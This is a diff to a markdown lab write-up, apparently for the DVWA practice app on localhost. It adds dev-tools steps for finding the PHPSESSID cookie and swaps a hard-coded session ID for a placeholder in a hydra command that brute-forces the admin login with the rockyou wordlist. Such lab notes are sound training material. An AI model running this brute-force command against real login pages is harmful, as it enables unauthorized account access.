@@ -4,11 +4,17 @@
 
 ### Brute Force
 
+:::info
+Obtain the cookie `PHPSESSID` in:
+
+`F12` → Application → Cookies(DropDown) → `https://localhost` → `PHPSESSID`
+:::
+
 ``` bash
 hydra -l admin \
 -P /usr/share/dict/rockyou.txt \
 -t 4 -f localhost http-get-form \
-"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=8677d7a4046f36c19fd4e9a724d2e4a8; security=medium:F=password incorrect"
+"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=COOKIE_HERE; security=medium:F=password incorrect"
 
 ```
 
